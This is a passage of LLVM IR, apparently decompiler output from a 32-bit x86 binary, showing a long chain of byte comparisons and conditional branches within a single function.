  %v0_804e883.pre.ph = phi i32 [ %v0_80500f9, %dec_label_pc_80500f9 ], [ %v0_80502f1, %dec_label_pc_80502f1 ]
  %v3_804e866684 = and i32 %v0_804e7c9, -256
  store i32 %v3_804e866684, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e863.dec_label_pc_804e883_crit_edge

dec_label_pc_804e863:                             ; preds = %dec_label_pc_804e851
  %v0_804e883.pre.pre = load i32, i32* @ebx, align 4
  %v10_804e863 = icmp eq i8 %v1_804e7b0, 74
  %v1_804e866 = zext i1 %v10_804e863 to i32
  %v3_804e866 = and i32 %v0_804e7c9, -256
  %v4_804e866 = or i32 %v3_804e866, %v1_804e866
  store i32 %v4_804e866, i32* %eax.global-to-local, align 4
  %v4_804e869 = icmp eq i1 %v10_804e863, false
  br i1 %v4_804e869, label %dec_label_pc_804e863.dec_label_pc_804e883_crit_edge, label %dec_label_pc_804e86d

dec_label_pc_804e863.dec_label_pc_804e883_crit_edge: ; preds = %dec_label_pc_804e863.thread, %dec_label_pc_804e863
  %v0_804e883.pre687 = phi i32 [ %v0_804e883.pre.ph, %dec_label_pc_804e863.thread ], [ %v0_804e883.pre.pre, %dec_label_pc_804e863 ]
  %.pre681 = trunc i32 %v0_804e883.pre687 to i8
  br label %dec_label_pc_804e883

dec_label_pc_804e86d:                             ; preds = %dec_label_pc_804e863
  %v1_804e86d = trunc i32 %v0_804e883.pre.pre to i8
  switch i8 %v1_804e86d, label %dec_label_pc_804e883 [
    i8 91, label %dec_label_pc_8050147
    i8 -55, label %dec_label_pc_8050130
  ]

dec_label_pc_804e883:                             ; preds = %dec_label_pc_804e863.dec_label_pc_804e883_crit_edge, %dec_label_pc_8050147, %dec_label_pc_8050130, %dec_label_pc_804e86d
  %v1_804e883.pre-phi = phi i8 [ %.pre681, %dec_label_pc_804e863.dec_label_pc_804e883_crit_edge ], [ 91, %dec_label_pc_8050147 ], [ -55, %dec_label_pc_8050130 ], [ %v1_804e86d, %dec_label_pc_804e86d ]
  %v11_804e883 = icmp eq i8 %v1_804e883.pre-phi, -47
  %v1_804e886 = zext i1 %v11_804e883 to i8
  %v3_804e886 = add i32 %v0_805015e, 32
  %v4_804e886 = inttoptr i32 %v3_804e886 to i8*
  store i8 %v1_804e886, i8* %v4_804e886, align 1
  %v0_804e88b = load i32, i32* @esp, align 4
  %v1_804e88b = add i32 %v0_804e88b, 44
  %v2_804e88b = inttoptr i32 %v1_804e88b to i8*
  %v3_804e88b = load i8, i8* %v2_804e88b, align 1
  %v4_804e88b = icmp eq i8 %v3_804e88b, 0
  br i1 %v4_804e88b, label %dec_label_pc_804e8b7, label %dec_label_pc_804e892

dec_label_pc_804e892:                             ; preds = %dec_label_pc_804e883
  %v1_804e892 = add i32 %v0_804e88b, 32
  %v2_804e892 = inttoptr i32 %v1_804e892 to i8*
  %v3_804e892 = load i8, i8* %v2_804e892, align 1
  %notlhs531 = icmp ne i8 %v3_804e892, 0
  %v4_804de51.off533 = add i8 %v4_804de51, -48
  %tmp780 = icmp ult i8 %v4_804de51.off533, 5
  %tmp781 = and i1 %tmp780, %notlhs531
  br i1 %tmp781, label %dec_label_pc_804de41, label %dec_label_pc_804e8ae

dec_label_pc_804e8ae:                             ; preds = %dec_label_pc_804e892
  %v0_804e8ae = load i32, i32* @ebx, align 4
  %v1_804e8ae = trunc i32 %v0_804e8ae to i8
  %v11_804e8ae = icmp eq i8 %v1_804e8ae, -91
  br i1 %v11_804e8ae, label %dec_label_pc_804de41, label %dec_label_pc_804e8b7

dec_label_pc_804e8b7:                             ; preds = %dec_label_pc_804e8ae, %dec_label_pc_804e883
  %v1_804e8b7 = add i32 %v0_804e88b, 75
  %v2_804e8b7 = inttoptr i32 %v1_804e8b7 to i8*
  %v3_804e8b7 = load i8, i8* %v2_804e8b7, align 1
  %v4_804e8b7 = icmp eq i8 %v3_804e8b7, 0
  br i1 %v4_804e8b7, label %dec_label_pc_804e8c7, label %dec_label_pc_804e8be

dec_label_pc_804e8be:                             ; preds = %dec_label_pc_804e8b7
  %v0_804e8be = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e8be = trunc i32 %v0_804e8be to i8
  %v11_804e8be = icmp eq i8 %v1_804e8be, -107
  br i1 %v11_804e8be, label %dec_label_pc_804de41, label %dec_label_pc_804e8c7

dec_label_pc_804e8c7:                             ; preds = %dec_label_pc_804e8be, %dec_label_pc_804e8b7
  %v1_804e8c7 = add i32 %v0_804e88b, 85
  %v2_804e8c7 = inttoptr i32 %v1_804e8c7 to i8*
  %v3_804e8c7 = load i8, i8* %v2_804e8c7, align 1
  %v4_804e8c7 = icmp eq i8 %v3_804e8c7, 0
  br i1 %v4_804e8c7, label %dec_label_pc_804e8d7, label %dec_label_pc_804e8ce

dec_label_pc_804e8ce:                             ; preds = %dec_label_pc_804e8c7
  %v0_804e8ce = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e8ce = trunc i32 %v0_804e8ce to i8
  %v11_804e8ce = icmp eq i8 %v1_804e8ce, -105
  br i1 %v11_804e8ce, label %dec_label_pc_804de41, label %dec_label_pc_804e8d7

dec_label_pc_804e8d7:                             ; preds = %dec_label_pc_804e8ce, %dec_label_pc_804e8c7
  %v1_804e8d7 = add i32 %v0_804e88b, 71
  %v2_804e8d7 = inttoptr i32 %v1_804e8d7 to i8*
  %v3_804e8d7 = load i8, i8* %v2_804e8d7, align 1
  %v4_804e8d7 = icmp eq i8 %v3_804e8d7, 0
  br i1 %v4_804e8d7, label %dec_label_pc_804e8e7, label %dec_label_pc_804e8de

dec_label_pc_804e8de:                             ; preds = %dec_label_pc_804e8d7
  %v0_804e8de = load i32, i32* @ebx, align 4
  %v1_804e8de = trunc i32 %v0_804e8de to i8
  %v11_804e8de = icmp eq i8 %v1_804e8de, -124
  br i1 %v11_804e8de, label %dec_label_pc_804de41, label %dec_label_pc_804e8e7

dec_label_pc_804e8e7:                             ; preds = %dec_label_pc_804e8de, %dec_label_pc_804e8d7
  %v0_804e8e7 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e8e7 = trunc i32 %v0_804e8e7 to i8
  %v8_804e8e7 = icmp eq i8 %v1_804e8e7, -80
  br i1 %v8_804e8e7, label %dec_label_pc_80502e3, label %dec_label_pc_804e8f0

dec_label_pc_804e8f0:                             ; preds = %dec_label_pc_80502e3, %dec_label_pc_804e8e7
  %v1_804e8f0 = add i32 %v0_804e88b, 81
  %v2_804e8f0 = inttoptr i32 %v1_804e8f0 to i8*
  %v3_804e8f0 = load i8, i8* %v2_804e8f0, align 1
  %v4_804e8f0 = icmp eq i8 %v3_804e8f0, 0
  br i1 %v4_804e8f0, label %dec_label_pc_804e902, label %dec_label_pc_804e8f7

dec_label_pc_804e8f7:                             ; preds = %dec_label_pc_804e8f0
  %v1_804e8f7 = add i32 %v0_804e88b, 70
  %v2_804e8f7 = inttoptr i32 %v1_804e8f7 to i8*
  %v3_804e8f7 = load i8, i8* %v2_804e8f7, align 1
  %v4_804e8f7 = icmp eq i8 %v3_804e8f7, 0
  %v1_804e8fc = icmp eq i1 %v4_804e8f7, false
  br i1 %v1_804e8fc, label %dec_label_pc_804de41, label %dec_label_pc_804e902

dec_label_pc_804e902:                             ; preds = %dec_label_pc_804e8f7, %dec_label_pc_804e8f0
  %v1_804e902 = add i32 %v0_804e88b, 73
  %v2_804e902 = inttoptr i32 %v1_804e902 to i8*
  %v3_804e902 = load i8, i8* %v2_804e902, align 1
  %v4_804e902 = icmp eq i8 %v3_804e902, 0
  %v1_80502ca = add i32 %v0_804e88b, 42
  %v2_80502ca = inttoptr i32 %v1_80502ca to i8*
  %v3_80502ca = load i8, i8* %v2_80502ca, align 1
  %v4_80502ca = icmp eq i8 %v3_80502ca, 0
  br i1 %v4_804e902, label %dec_label_pc_80502ca, label %dec_label_pc_804e90d

dec_label_pc_804e90d:                             ; preds = %dec_label_pc_804e902
  %v1_804e912 = icmp eq i1 %v4_80502ca, false
  br i1 %v1_804e912, label %dec_label_pc_804de41, label %dec_label_pc_804e918

dec_label_pc_804e918:                             ; preds = %dec_label_pc_80502d5, %dec_label_pc_80502ca, %dec_label_pc_804e90d
  %v1_804e918 = add i32 %v0_804e88b, 67
  %v2_804e918 = inttoptr i32 %v1_804e918 to i8*
  %v3_804e918 = load i8, i8* %v2_804e918, align 1
  %v4_804e918 = icmp eq i8 %v3_804e918, 0
  %v1_80502b1 = add i32 %v0_804e88b, 37
  %v2_80502b1 = inttoptr i32 %v1_80502b1 to i8*
  %v3_80502b1 = load i8, i8* %v2_80502b1, align 1
  %v4_80502b1 = icmp eq i8 %v3_80502b1, 0
  br i1 %v4_804e918, label %dec_label_pc_80502b1, label %dec_label_pc_804e923

dec_label_pc_804e923:                             ; preds = %dec_label_pc_804e918
  %v1_804e928 = icmp eq i1 %v4_80502b1, false
  br i1 %v1_804e928, label %dec_label_pc_804de41, label %dec_label_pc_804e92e

dec_label_pc_804e92e:                             ; preds = %dec_label_pc_80502bc, %dec_label_pc_80502b1, %dec_label_pc_804e923
  %v10_804e92e = icmp eq i8 %v1_804e8e7, 46
  br i1 %v10_804e92e, label %dec_label_pc_80502a3, label %dec_label_pc_804e937

dec_label_pc_804e937:                             ; preds = %dec_label_pc_80502a3, %dec_label_pc_804e92e
  %v10_804e937 = icmp eq i8 %v1_804e8e7, 51
  %v1_804e93a = zext i1 %v10_804e937 to i8
  %v3_804e93a = add i32 %v0_804e88b, 31
  %v4_804e93a = inttoptr i32 %v3_804e93a to i8*
  store i8 %v1_804e93a, i8* %v4_804e93a, align 1
  %v0_804e93f = load i32, i32* @esp, align 4
  %v1_804e93f = add i32 %v0_804e93f, 55
  %v2_804e93f = inttoptr i32 %v1_804e93f to i8*
  %v3_804e93f = load i8, i8* %v2_804e93f, align 1
  %v4_804e93f = icmp eq i8 %v3_804e93f, 0
  %v1_805028a = add i32 %v0_804e93f, 31
  %v2_805028a = inttoptr i32 %v1_805028a to i8*
  %v3_805028a = load i8, i8* %v2_805028a, align 1
  %v4_805028a = icmp eq i8 %v3_805028a, 0
  br i1 %v4_804e93f, label %dec_label_pc_805028a, label %dec_label_pc_804e94a

dec_label_pc_804e94a:                             ; preds = %dec_label_pc_804e937
  %v1_804e94f = icmp eq i1 %v4_805028a, false
  br i1 %v1_804e94f, label %dec_label_pc_804de41, label %dec_label_pc_804e955

dec_label_pc_804e955:                             ; preds = %dec_label_pc_8050295, %dec_label_pc_805028a, %dec_label_pc_804e94a
  %v0_804e955 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e955 = trunc i32 %v0_804e955 to i8
  %v10_804e955 = icmp eq i8 %v1_804e955, 5
  %v1_804e958 = zext i1 %v10_804e955 to i32
  %v2_804e958 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e958 = and i32 %v2_804e958, -256
  %v4_804e958 = or i32 %v1_804e958, %v3_804e958
  store i32 %v4_804e958, i32* %eax.global-to-local, align 4
  %v4_804e95b = icmp eq i1 %v10_804e955, false
  br i1 %v4_804e95b, label %dec_label_pc_804e968, label %dec_label_pc_804e95f

dec_label_pc_804e95f:                             ; preds = %dec_label_pc_804e955
  %v0_804e95f = load i32, i32* @ebx, align 4
  %v1_804e95f = trunc i32 %v0_804e95f to i8
  %v11_804e95f = icmp eq i8 %v1_804e95f, -121
  br i1 %v11_804e95f, label %dec_label_pc_804de41, label %dec_label_pc_804e968

dec_label_pc_804e968:                             ; preds = %dec_label_pc_804e95f, %dec_label_pc_804e955
  %v1_804e968 = add i32 %v0_804e93f, 79
  %v2_804e968 = inttoptr i32 %v1_804e968 to i8*
  %v3_804e968 = load i8, i8* %v2_804e968, align 1
  %v4_804e968 = icmp eq i8 %v3_804e968, 0
  br i1 %v4_804e968, label %dec_label_pc_805025e, label %dec_label_pc_804e973

dec_label_pc_804e973:                             ; preds = %dec_label_pc_804e968
  %v1_804e975 = icmp eq i1 %v4_804e95b, false
  br i1 %v1_804e975, label %dec_label_pc_804de41, label %dec_label_pc_804e97b

dec_label_pc_804e97b:                             ; preds = %dec_label_pc_8050266, %dec_label_pc_805025e, %dec_label_pc_804e973
  %v10_804e97b = icmp eq i8 %v1_804e955, 91
  br i1 %v10_804e97b, label %dec_label_pc_805033f, label %dec_label_pc_804e984

dec_label_pc_804e984:                             ; preds = %dec_label_pc_805033f, %dec_label_pc_804e97b
  %v1_804e984 = add i32 %v0_804e93f, 45
  %v2_804e984 = inttoptr i32 %v1_804e984 to i8*
  %v3_804e984 = load i8, i8* %v2_804e984, align 1
  %v4_804e984 = icmp eq i8 %v3_804e984, 0
  br i1 %v4_804e984, label %dec_label_pc_804e994, label %dec_label_pc_804e98b

dec_label_pc_804e98b:                             ; preds = %dec_label_pc_804e984
  %v0_804e98b = load i32, i32* @ebx, align 4
  %v1_804e98b = trunc i32 %v0_804e98b to i8
  %v11_804e98b = icmp ne i8 %v1_804e98b, -56
  %or.cond415 = or i1 %v1_8050013, %v11_804e98b
  %or.cond415.not = xor i1 %or.cond415, true
  %tmp782 = icmp ult i8 %v4_804de51, -97
  %or.cond417 = and i1 %tmp782, %or.cond415.not
  br i1 %or.cond417, label %dec_label_pc_804de41, label %dec_label_pc_804e994

dec_label_pc_804e994:                             ; preds = %dec_label_pc_804e98b, %dec_label_pc_804e984
  %v1_804e994 = add i32 %v0_804e93f, 40
  %v2_804e994 = inttoptr i32 %v1_804e994 to i8*
  %v3_804e994 = load i8, i8* %v2_804e994, align 1
  %v4_804e994 = icmp eq i8 %v3_804e994, 0
  br i1 %v4_804e994, label %dec_label_pc_804e9b4, label %dec_label_pc_804e99b

dec_label_pc_804e99b:                             ; preds = %dec_label_pc_804e994
  %v0_804e99b = load i32, i32* @ebx, align 4
  %v1_804e99b = trunc i32 %v0_804e99b to i8
  %notlhs534 = icmp eq i8 %v1_804e99b, -104
  %v4_804de51.off536 = add i8 %v4_804de51, -96
  %tmp783 = icmp ult i8 %v4_804de51.off536, 15
  %tmp784 = and i1 %tmp783, %notlhs534
  br i1 %tmp784, label %dec_label_pc_804de41, label %dec_label_pc_804e9a4

dec_label_pc_804e9a4:                             ; preds = %dec_label_pc_804e99b
  %notlhs537 = icmp eq i8 %v1_804e99b, -75
  %v4_804de51.off539 = add i8 %v4_804de51, 96
  %tmp785 = icmp ult i8 %v4_804de51.off539, 29
  %tmp786 = and i1 %tmp785, %notlhs537
  br i1 %tmp786, label %dec_label_pc_804de41, label %dec_label_pc_804e9b4

dec_label_pc_804e9b4:                             ; preds = %dec_label_pc_804e9a4, %dec_label_pc_804e994
  %v1_804e9b4 = add i32 %v0_804e93f, 84
  %v2_804e9b4 = inttoptr i32 %v1_804e9b4 to i8*
  %v3_804e9b4 = load i8, i8* %v2_804e9b4, align 1
  %v4_804e9b4 = icmp eq i8 %v3_804e9b4, 0
  br i1 %v4_804e9b4, label %dec_label_pc_804e9d0, label %dec_label_pc_804e9bb

dec_label_pc_804e9bb:                             ; preds = %dec_label_pc_804e9b4
  %v1_804e9bb = add i32 %v0_804e93f, 59
  %v2_804e9bb = inttoptr i32 %v1_804e9bb to i8*
  %v3_804e9bb = load i8, i8* %v2_804e9bb, align 1
  %notlhs540 = icmp ne i8 %v3_804e9bb, 0
  %v4_804de51.off542 = add i8 %v4_804de51, -64
  %tmp787 = icmp ult i8 %v4_804de51.off542, 31
  %tmp788 = and i1 %tmp787, %notlhs540
  br i1 %tmp788, label %dec_label_pc_804de41, label %dec_label_pc_804e9d0

dec_label_pc_804e9d0:                             ; preds = %dec_label_pc_804e9bb, %dec_label_pc_804e9b4
  %v1_804e9d0 = add i32 %v0_804e93f, 39
  %v2_804e9d0 = inttoptr i32 %v1_804e9d0 to i8*
  %v3_804e9d0 = load i8, i8* %v2_804e9d0, align 1
  %notlhs543 = icmp eq i8 %v3_804e9d0, 0
  %notrhs544 = icmp ne i8 %v1_804e955, -72
  %or.cond260.not = or i1 %notrhs544, %notlhs543
  %tmp789 = icmp ult i8 %v4_804de51, -16
  %or.cond432 = or i1 %tmp789, %or.cond260.not
  %or.cond432.not = xor i1 %or.cond432, true
  %v12_8050356 = icmp eq i8 %v4_804de51, -1
  %v1_8050359 = icmp eq i1 %v12_8050356, false
  %or.cond434 = and i1 %v1_8050359, %or.cond432.not
  br i1 %or.cond434, label %dec_label_pc_804de41, label %dec_label_pc_804e9e0

dec_label_pc_804e9e0:                             ; preds = %dec_label_pc_804e9d0
  %v1_804e9e0 = add i32 %v0_804e93f, 87
  %v2_804e9e0 = inttoptr i32 %v1_804e9e0 to i8*
  %v3_804e9e0 = load i8, i8* %v2_804e9e0, align 1
  %v4_804e9e0 = icmp eq i8 %v3_804e9e0, 0
  br i1 %v4_804e9e0, label %dec_label_pc_804ea10, label %dec_label_pc_804e9e7

dec_label_pc_804e9e7:                             ; preds = %dec_label_pc_804e9e0
  %v0_804e9e7 = load i32, i32* @ebx, align 4
  %v1_804e9e7 = trunc i32 %v0_804e9e7 to i8
  %v10_804e9e7 = icmp ne i8 %v1_804e9e7, 111
  %or.cond440 = or i1 %v1_8050013, %v10_804e9e7
  %or.cond440.not = xor i1 %or.cond440, true
  %tmp790 = icmp ult i8 %v4_804de51, -113
  %or.cond442 = and i1 %tmp790, %or.cond440.not
  br i1 %or.cond442, label %dec_label_pc_804de41, label %dec_label_pc_804e9f7

dec_label_pc_804e9f7:                             ; preds = %dec_label_pc_804e9e7
  %notlhs545 = icmp eq i8 %v1_804e9e7, -4
  %v4_804de51.off547 = add i8 %v4_804de51, 48
  %tmp791 = icmp ult i8 %v4_804de51.off547, 15
  %tmp792 = and i1 %tmp791, %notlhs545
  br i1 %tmp792, label %dec_label_pc_804de41, label %dec_label_pc_804ea00

dec_label_pc_804ea00:                             ; preds = %dec_label_pc_804e9f7
  %notlhs548 = icmp eq i8 %v1_804e9e7, 40
  %v4_804de51.off550 = add i8 %v4_804de51, -56
  %tmp793 = icmp ult i8 %v4_804de51.off550, 3
  %tmp794 = and i1 %tmp793, %notlhs548
  br i1 %tmp794, label %dec_label_pc_804de41, label %dec_label_pc_804ea10

dec_label_pc_804ea10:                             ; preds = %dec_label_pc_804ea00, %dec_label_pc_804e9e0
  %v1_804ea10 = add i32 %v0_804e93f, 54
  %v2_804ea10 = inttoptr i32 %v1_804ea10 to i8*
  %v3_804ea10 = load i8, i8* %v2_804ea10, align 1
  %v4_804ea10 = icmp eq i8 %v3_804ea10, 0
  br i1 %v4_804ea10, label %dec_label_pc_804ea20, label %dec_label_pc_804ea17

dec_label_pc_804ea17:                             ; preds = %dec_label_pc_804ea10
  %v0_804ea17 = load i32, i32* @ebx, align 4
  %v1_804ea17 = trunc i32 %v0_804ea17 to i8
  %notlhs551 = icmp eq i8 %v1_804ea17, 8
  %v4_804de51.off553 = add i8 %v4_804de51, -81
  %tmp795 = icmp ult i8 %v4_804de51.off553, 14
  %tmp796 = and i1 %tmp795, %notlhs551
  br i1 %tmp796, label %dec_label_pc_804de41, label %dec_label_pc_804ea20

dec_label_pc_804ea20:                             ; preds = %dec_label_pc_804ea17, %dec_label_pc_804ea10
  %v1_804ea20 = add i32 %v0_804e93f, 46
  %v2_804ea20 = inttoptr i32 %v1_804ea20 to i8*
  %v3_804ea20 = load i8, i8* %v2_804ea20, align 1
  %v4_804ea20 = icmp eq i8 %v3_804ea20, 0
  br i1 %v4_804ea20, label %dec_label_pc_804ea30, label %dec_label_pc_804ea27

dec_label_pc_804ea27:                             ; preds = %dec_label_pc_804ea20
  %v0_804ea27 = load i32, i32* @ebx, align 4
  %v1_804ea27 = trunc i32 %v0_804ea27 to i8
  %notlhs554 = icmp eq i8 %v1_804ea27, 116
  %v4_804de51.off556 = add i8 %v4_804de51, -112
  %tmp797 = icmp ult i8 %v4_804de51.off556, 7
  %tmp798 = and i1 %tmp797, %notlhs554
  br i1 %tmp798, label %dec_label_pc_804de41, label %dec_label_pc_804ea30

dec_label_pc_804ea30:                             ; preds = %dec_label_pc_804ea27, %dec_label_pc_804ea20
  %v1_804ea30 = add i32 %v0_804e93f, 77
  %v2_804ea30 = inttoptr i32 %v1_804ea30 to i8*
  %v3_804ea30 = load i8, i8* %v2_804ea30, align 1
  %v4_804ea30 = icmp eq i8 %v3_804ea30, 0
  br i1 %v4_804ea30, label %dec_label_pc_804ea4c, label %dec_label_pc_804ea37

dec_label_pc_804ea37:                             ; preds = %dec_label_pc_804ea30
  br i1 %v4_804ea20, label %dec_label_pc_804ea6c, label %dec_label_pc_804ea3e

dec_label_pc_804ea3e:                             ; preds = %dec_label_pc_804ea37
  %tmp799 = icmp ugt i8 %v4_804de51, -9
  %or.cond262 = and i1 %tmp799, %v1_8050359
  br i1 %or.cond262, label %dec_label_pc_804de41, label %dec_label_pc_804ea53

dec_label_pc_804ea4c:                             ; preds = %dec_label_pc_804ea30
  br i1 %v4_804ea20, label %dec_label_pc_804ea6c, label %dec_label_pc_804ea53

dec_label_pc_804ea53:                             ; preds = %dec_label_pc_804ea3e, %dec_label_pc_804ea4c
  %v0_804ea53 = load i32, i32* @ebx, align 4
  %v1_804ea53 = trunc i32 %v0_804ea53 to i8
  %notlhs557 = icmp eq i8 %v1_804ea53, 36
  %v4_804de51.off559 = add i8 %v4_804de51, 36
  %tmp800 = icmp ult i8 %v4_804de51.off559, 3
  %tmp801 = and i1 %tmp800, %notlhs557
  br i1 %tmp801, label %dec_label_pc_804de41, label %dec_label_pc_804ea5c

dec_label_pc_804ea5c:                             ; preds = %dec_label_pc_804ea53
  %notlhs560 = icmp eq i8 %v1_804ea53, 58
  %v4_804de51.off562 = add i8 %v4_804de51, 72
  %tmp802 = icmp ult i8 %v4_804de51.off562, 3
  %tmp803 = and i1 %tmp802, %notlhs560
  br i1 %tmp803, label %dec_label_pc_804de41, label %dec_label_pc_804ea6c

dec_label_pc_804ea6c:                             ; preds = %dec_label_pc_804ea5c, %dec_label_pc_804ea4c, %dec_label_pc_804ea37
  %v11_804ea6c = icmp eq i8 %v1_804e955, -50
  br i1 %v11_804ea6c, label %dec_label_pc_804fdda, label %dec_label_pc_804ea75

dec_label_pc_804ea75:                             ; preds = %dec_label_pc_804fdda, %dec_label_pc_804ea6c
  %v1_804ea75 = add i32 %v0_804e93f, 35
  %v2_804ea75 = inttoptr i32 %v1_804ea75 to i8*
  %v3_804ea75 = load i8, i8* %v2_804ea75, align 1
  %v4_804ea75 = icmp eq i8 %v3_804ea75, 0
  br i1 %v4_804ea75, label %dec_label_pc_804ea95, label %dec_label_pc_804ea7c

dec_label_pc_804ea7c:                             ; preds = %dec_label_pc_804ea75
  %v0_804ea7c = load i32, i32* @ebx, align 4
  %v1_804ea7c = trunc i32 %v0_804ea7c to i8
  %notlhs563 = icmp eq i8 %v1_804ea7c, 78
  %v4_804de51.off565 = add i8 %v4_804de51, -40
  %tmp804 = icmp ult i8 %v4_804de51.off565, 3
  %tmp805 = and i1 %tmp804, %notlhs563
  br i1 %tmp805, label %dec_label_pc_804de41, label %dec_label_pc_804ea85

dec_label_pc_804ea85:                             ; preds = %dec_label_pc_804ea7c
  %notlhs566 = icmp eq i8 %v1_804ea7c, 93
  %v9_804fe48 = icmp eq i8 %v4_804de51, -64
  %tmp806 = and i1 %v9_804fe48, %notlhs566
  br i1 %tmp806, label %dec_label_pc_804de41, label %dec_label_pc_804ea95

dec_label_pc_804ea95:                             ; preds = %dec_label_pc_804ea85, %dec_label_pc_804ea75
  %v1_804ea95 = add i32 %v0_804e93f, 34
  %v2_804ea95 = inttoptr i32 %v1_804ea95 to i8*
  %v3_804ea95 = load i8, i8* %v2_804ea95, align 1
  %v4_804ea95 = icmp eq i8 %v3_804ea95, 0
  br i1 %v4_804ea95, label %dec_label_pc_804eaa5, label %dec_label_pc_804ea9c

dec_label_pc_804ea9c:                             ; preds = %dec_label_pc_804ea95
  %v0_804ea9c = load i32, i32* @ebx, align 4
  %v1_804ea9c = trunc i32 %v0_804ea9c to i8
  %v10_804ea9c = icmp ne i8 %v1_804ea9c, 71
  %or.cond290 = or i1 %tmp789, %v10_804ea9c
  %or.cond290.not = xor i1 %or.cond290, true
  %or.cond291 = and i1 %v1_8050359, %or.cond290.not
  br i1 %or.cond291, label %dec_label_pc_804de41, label %dec_label_pc_804eaa5

dec_label_pc_804eaa5:                             ; preds = %dec_label_pc_804ea9c, %dec_label_pc_804ea95
  %v10_804eaa5 = icmp eq i8 %v1_804e955, 98
  br i1 %v10_804eaa5, label %dec_label_pc_804fda3, label %dec_label_pc_804eaae

dec_label_pc_804eaae:                             ; preds = %dec_label_pc_804fda3, %dec_label_pc_804eaa5
  br i1 %v4_804e994, label %dec_label_pc_804eac3, label %dec_label_pc_804eab5

dec_label_pc_804eab5:                             ; preds = %dec_label_pc_804eaae
  %v0_804eab5 = load i32, i32* @ebx, align 4
  %tmp807 = and i32 %v0_804eab5, 252
  %tmp808 = icmp eq i32 %tmp807, 20
  br i1 %tmp808, label %dec_label_pc_804de41, label %dec_label_pc_804eac3

dec_label_pc_804eac3:                             ; preds = %dec_label_pc_804eab5, %dec_label_pc_804eaae
  %v10_804eac3 = icmp eq i8 %v1_804e955, 35
  br i1 %v10_804eac3, label %dec_label_pc_804fd36, label %dec_label_pc_804eacc

dec_label_pc_804eacc:                             ; preds = %dec_label_pc_804fd36, %dec_label_pc_804eac3
  %v10_804eacc = icmp eq i8 %v1_804e955, 52
  %v1_804eacf = zext i1 %v10_804eacc to i32
  %v4_804eacf = or i32 %v1_804eacf, %v3_804e958
  store i32 %v4_804eacf, i32* %eax.global-to-local, align 4
  %v1_804ead2 = add i32 %v0_804e93f, 50
  %v2_804ead2 = inttoptr i32 %v1_804ead2 to i8*
  %v3_804ead2 = load i8, i8* %v2_804ead2, align 1
  %v4_804ead2 = icmp eq i8 %v3_804ead2, 0
  %v4_804eae6 = icmp eq i1 %v10_804eacc, false
  br i1 %v4_804ead2, label %dec_label_pc_804eae6, label %dec_label_pc_804ead9

dec_label_pc_804ead9:                             ; preds = %dec_label_pc_804eacc
  br i1 %v4_804eae6, label %dec_label_pc_804eaf8, label %dec_label_pc_804eadd

dec_label_pc_804eadd:                             ; preds = %dec_label_pc_804ead9
  %v0_804eadd = load i32, i32* @ebx, align 4
  %v1_804eadd = trunc i32 %v0_804eadd to i8
  %tmp809 = icmp ult i8 %v1_804eadd, 95
  br i1 %tmp809, label %dec_label_pc_804de41, label %dec_label_pc_804eaea

dec_label_pc_804eae6:                             ; preds = %dec_label_pc_804eacc
  br i1 %v4_804eae6, label %dec_label_pc_804eaf8, label %dec_label_pc_804eae6.dec_label_pc_804eaea_crit_edge

dec_label_pc_804eae6.dec_label_pc_804eaea_crit_edge: ; preds = %dec_label_pc_804eae6
  %v0_804eaea.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804eaea

dec_label_pc_804eaea:                             ; preds = %dec_label_pc_804eae6.dec_label_pc_804eaea_crit_edge, %dec_label_pc_804eadd
  %v0_804eaea = phi i32 [ %v0_804eaea.pre, %dec_label_pc_804eae6.dec_label_pc_804eaea_crit_edge ], [ %v0_804eadd, %dec_label_pc_804eadd ]
  %v1_804eaea = trunc i32 %v0_804eaea to i8
  %tmp810 = icmp ugt i8 %v1_804eaea, 94
  %v11_804eaef = icmp eq i8 %v1_804eaea, -1
  %v1_804eaf2 = icmp eq i1 %v11_804eaef, false
  %or.cond266 = and i1 %tmp810, %v1_804eaf2
  br i1 %or.cond266, label %dec_label_pc_804de41, label %dec_label_pc_804eaf8

dec_label_pc_804eaf8:                             ; preds = %dec_label_pc_804eaea, %dec_label_pc_804eae6, %dec_label_pc_804ead9
  %v10_804eaf8 = icmp eq i8 %v1_804e955, 54
  %v1_804eafb = zext i1 %v10_804eaf8 to i32
  %v4_804eafb = or i32 %v1_804eafb, %v3_804e958
  store i32 %v4_804eafb, i32* %eax.global-to-local, align 4
  %v1_804eafe = add i32 %v0_804e93f, 57
  %v2_804eafe = inttoptr i32 %v1_804eafe to i8*
  %v3_804eafe = load i8, i8* %v2_804eafe, align 1
  %v4_804eafe = icmp eq i8 %v3_804eafe, 0
  %v4_804eb12 = icmp eq i1 %v10_804eaf8, false
  br i1 %v4_804eafe, label %dec_label_pc_804eb12, label %dec_label_pc_804eb05

dec_label_pc_804eb05:                             ; preds = %dec_label_pc_804eaf8
  br i1 %v4_804eb12, label %dec_label_pc_804eb24, label %dec_label_pc_804eb09

dec_label_pc_804eb09:                             ; preds = %dec_label_pc_804eb05
  %v0_804eb09 = load i32, i32* @ebx, align 4
  %v1_804eb09 = trunc i32 %v0_804eb09 to i8
  %tmp811 = icmp ult i8 %v1_804eb09, 95
  br i1 %tmp811, label %dec_label_pc_804de41, label %dec_label_pc_804eb16

dec_label_pc_804eb12:                             ; preds = %dec_label_pc_804eaf8
  br i1 %v4_804eb12, label %dec_label_pc_804eb24, label %dec_label_pc_804eb12.dec_label_pc_804eb16_crit_edge

dec_label_pc_804eb12.dec_label_pc_804eb16_crit_edge: ; preds = %dec_label_pc_804eb12
  %v0_804eb16.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804eb16

dec_label_pc_804eb16:                             ; preds = %dec_label_pc_804eb12.dec_label_pc_804eb16_crit_edge, %dec_label_pc_804eb09
  %v0_804eb16 = phi i32 [ %v0_804eb16.pre, %dec_label_pc_804eb12.dec_label_pc_804eb16_crit_edge ], [ %v0_804eb09, %dec_label_pc_804eb09 ]
  %v1_804eb16 = trunc i32 %v0_804eb16 to i8
  %tmp812 = icmp ugt i8 %v1_804eb16, -113
  %v11_804eb1b = icmp eq i8 %v1_804eb16, -1
  %v1_804eb1e = icmp eq i1 %v11_804eb1b, false
  %or.cond267 = and i1 %tmp812, %v1_804eb1e
  br i1 %or.cond267, label %dec_label_pc_804de41, label %dec_label_pc_804eb24

